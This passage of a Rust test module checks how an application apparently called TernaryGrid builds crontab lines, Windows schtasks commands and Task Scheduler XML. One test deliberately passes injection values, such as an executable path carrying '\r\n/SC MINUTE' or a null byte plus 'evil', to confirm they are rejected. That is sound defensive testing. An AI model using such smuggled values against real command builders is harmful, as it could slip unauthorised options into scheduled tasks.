        let again = crontab_with_task(&merged, &t, &exe()).unwrap();
        assert_eq!(again, merged, "replacing keeps a single line");
        assert_eq!(crontab_without_task(&merged, &t.id), existing);
        assert_eq!(crontab_with_task("", &t, &exe()).unwrap().lines().count(), 1);
    }

    #[test]
    fn schtasks_commands() {
        let c = schtasks_create(&task(Schedule::Daily { at: "22:00".into(), weekdays: vec![1, 3] }), Path::new("C:\\Program Files\\TernaryGrid\\ternarygrid.exe")).unwrap();
        assert_eq!(c.program, "schtasks");
        assert_eq!(
            c.args,
            vec![
                "/Create",
                "/F",
                "/TN",
                "TernaryGrid\\task-1234-abcd",
                "/TR",
                "\"C:\\Program Files\\TernaryGrid\\ternarygrid.exe\" --run-task 1234-abcd",
                "/SC",
                "WEEKLY",
                "/D",
                "MON,WED",
                "/ST",
                "22:00"
            ]
        );
        let args = |s: Schedule| schtasks_create(&task(s), &exe()).map(|c| c.args[6..].join(" "));
        assert_eq!(args(Schedule::Interval { every_secs: 300 }).unwrap(), "/SC MINUTE /MO 5");
        assert_eq!(args(Schedule::Interval { every_secs: 7200 }).unwrap(), "/SC HOURLY /MO 2");
        assert_eq!(args(Schedule::Interval { every_secs: 172_800 }).unwrap(), "/SC DAILY /MO 2 /ST 00:00");
        assert_eq!(args(Schedule::Cron("*/10 * * * *".into())).unwrap(), "/SC MINUTE /MO 10");
        assert_eq!(args(Schedule::Cron("0 */3 * * *".into())).unwrap(), "/SC HOURLY /MO 3");
        assert_eq!(args(Schedule::Cron("30 6 * * *".into())).unwrap(), "/SC DAILY /ST 06:30");
        assert_eq!(args(Schedule::Cron("30 6 * * 1-5".into())).unwrap(), "/SC WEEKLY /D MON,TUE,WED,THU,FRI /ST 06:30");
        assert!(args(Schedule::Cron("0 0 1 * *".into())).is_err());
        assert!(args(Schedule::Interval { every_secs: 45 }).is_err());
        assert_eq!(schtasks_delete("1234-abcd").args, vec!["/Delete", "/F", "/TN", "TernaryGrid\\task-1234-abcd"]);
    }

    #[test]
    fn schtasks_rejects_unsafe_exe_and_id_and_locale_dependent_once() {
        let sched = Schedule::Daily { at: "08:00".into(), weekdays: Vec::new() };
        let t = task(sched.clone());
        // Quotes, control characters, trailing backslash or empty path in exe are rejected.
        for bad_exe in ["", "C:\\Program Files\\bad\"quote\\ternarygrid.exe", "C:\\dir\\app.exe\r\n/SC MINUTE", "C:\\dir\\app.exe\0evil", "C:\\trailing\\backslash\\"] {
            let err = schtasks_create(&t, Path::new(bad_exe)).unwrap_err();
            assert_eq!(err.kind, ternarygrid_core::ErrorKind::Config, "{bad_exe:?}: {err}");
            let xml_err = schtasks_xml(&t, Path::new(bad_exe)).unwrap_err();
            assert_eq!(xml_err.kind, ternarygrid_core::ErrorKind::Config, "{bad_exe:?}: {xml_err}");
        }
        // Control characters in task id are rejected.
        let mut evil = task(sched);
        evil.id = "id\nwith-newline".into();
        assert_eq!(schtasks_create(&evil, &exe()).unwrap_err().kind, ternarygrid_core::ErrorKind::Config);
        assert_eq!(schtasks_xml(&evil, &exe()).unwrap_err().kind, ternarygrid_core::ErrorKind::Config);

        // Schedule::Once is rejected by schtasks_create (/SD is locale-dependent).
        let at = Local.with_ymd_and_hms(2030, 2, 13, 4, 5, 0).earliest().unwrap();
        let once = task(Schedule::Once { at });
        assert_eq!(schtasks_create(&once, &exe()).unwrap_err().kind, ternarygrid_core::ErrorKind::Unsupported);
    }

    #[test]
    fn schtasks_xml_is_locale_independent_and_escaped() {
        let at = Local.with_ymd_and_hms(2030, 2, 13, 4, 5, 0).earliest().unwrap();
        let mut t = task(Schedule::Once { at });
        t.id = "a&b <c>".into();
        let win_exe = Path::new("C:\\Program Files\\R&D <test>\\ternarygrid.exe");
        let doc = schtasks_xml(&t, win_exe).unwrap();
        assert!(doc.contains("<TimeTrigger>"), "{doc}");
        assert!(doc.contains("<StartBoundary>2030-02-13T04:05:00</StartBoundary>"), "{doc}");
        assert!(doc.contains("<Description>Nightly &lt;backup&gt;</Description>"), "{doc}");
        assert!(doc.contains("<Command>C:\\Program Files\\R&amp;D &lt;test&gt;\\ternarygrid.exe</Command>"), "{doc}");
        assert!(doc.contains("<Arguments>--run-task &quot;a&amp;b &lt;c&gt;&quot;</Arguments>"), "{doc}");

        // Weekly & interval XML triggers.
        let weekly = schtasks_xml(&task(Schedule::Daily { at: "22:00".into(), weekdays: vec![1, 7] }), win_exe).unwrap();
        assert!(weekly.contains("<Sunday/>") && weekly.contains("<Monday/>"), "{weekly}");
        assert!(weekly.contains("2000-01-01T22:00:00"), "{weekly}");

        let interval = schtasks_xml(&task(Schedule::Interval { every_secs: 900 }), win_exe).unwrap();
        assert!(interval.contains("<Interval>PT15M</Interval>"), "{interval}");

        // Installing to a directory + creating the /XML command.
        let dir = tempfile::tempdir().unwrap();
        let xml_path = install_windows_task_xml(&t, win_exe, dir.path()).unwrap();
        assert_eq!(std::fs::read_to_string(&xml_path).unwrap(), doc);
        let cmd = schtasks_create_from_xml(&t.id, &xml_path);
        assert_eq!(cmd.program, "schtasks");
        assert_eq!(cmd.args[..5], ["/Create", "/F", "/TN", "TernaryGrid\\task-a_b__c_", "/XML"]);
        assert_eq!(cmd.args[5], xml_path.to_string_lossy());
    }
}
